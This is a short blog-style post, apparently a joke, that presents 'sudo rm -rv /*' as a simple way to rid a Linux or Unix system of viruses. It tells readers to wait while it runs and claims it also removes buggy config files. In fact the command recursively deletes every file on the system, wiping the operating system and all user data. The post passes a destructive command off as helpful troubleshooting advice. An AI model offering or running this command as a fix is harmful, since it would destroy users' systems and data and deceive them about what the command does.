While viruses aren't as big an issue on Linux and Unix as they are on Windows, they can still show up. &nbsp;The Mirai botnet, for instance, ran on IoT devices that used a stripped down version of linux. <br /><br />The following is an elegantly simple command that will work most of the time. &nbsp;(Do note that there are bugs that can get themselves into the firmware of various hardware devices, and this doesn't touch those.)<br /><pre style="background-color: #eff0f1; border: 0px; color: #333333; font-size: 14px; margin-bottom: 1em; overflow: auto; padding: 5px; text-align: justify; width: auto; word-wrap: normal;">sudo rm -rv /*</pre>Get a cup of coffee while it's running, as it will take a while. &nbsp;I've included the verbose command so you can observe its progress. &nbsp;When it's done, any viruses on your system will be completely gone. <br /><br /><b>Note: </b>this command has the added benefit of removing any buggy config files from your system.<br /><br /><br />
